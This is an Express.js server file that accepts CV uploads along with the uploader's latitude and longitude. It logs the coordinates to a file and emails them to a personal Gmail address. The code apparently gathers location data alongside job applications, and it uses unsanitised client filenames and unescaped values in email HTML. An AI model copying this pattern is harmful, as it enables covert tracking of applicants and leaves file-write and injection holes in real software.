// server.js (CommonJS compatible for Render)
const express = require("express");
const multer = require("multer");
const fs = require("fs");
const path = require("path");
const dotenv = require("dotenv");
const { Resend } = require("resend");

dotenv.config();

const app = express();
const PORT = process.env.PORT || 10000;

app.use(express.json());
app.use(express.static("public"));

const uploadDir = path.join(process.cwd(), "uploads");
if (!fs.existsSync(uploadDir)) fs.mkdirSync(uploadDir);

const storage = multer.diskStorage({
  destination: (req, file, cb) => cb(null, "uploads/"),
  filename: (req, file, cb) => cb(null, `${Date.now()}-${file.originalname}`)
});
const upload = multer({ storage });

const resend = new Resend(process.env.RESEND_API_KEY);

app.get("/", (req, res) => {
  res.sendFile(path.join(process.cwd(), "public", "index.html"));
});

app.post("/upload", upload.single("cv"), async (req, res) => {
  try {
    const { latitude, longitude } = req.body;
    const logEntry = `✅ CV uploaded: ${req.file.filename}\n📍 Location: ${latitude}, ${longitude}\n\n`;
    fs.appendFileSync("location.log", logEntry);

    await resend.emails.send({
      from: "SOS Webhook <no-reply@soswebhook.com>",
      to: "amitgorai114@gmail.com",
      subject: "📍 New CV Uploaded with Location",
      html: `
        <h2>New CV Uploaded</h2>
        <p><b>File:</b> ${req.file.filename}</p>
        <p><b>Location:</b> ${latitude}, ${longitude}</p>
        <p>Check local uploads folder for the CV.</p>
      `,
    });

    res.status(200).send("CV uploaded and location logged successfully!");
  } catch (err) {
    console.error(err);
    res.status(500).send("Internal Server Error");
  }
});

app.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));
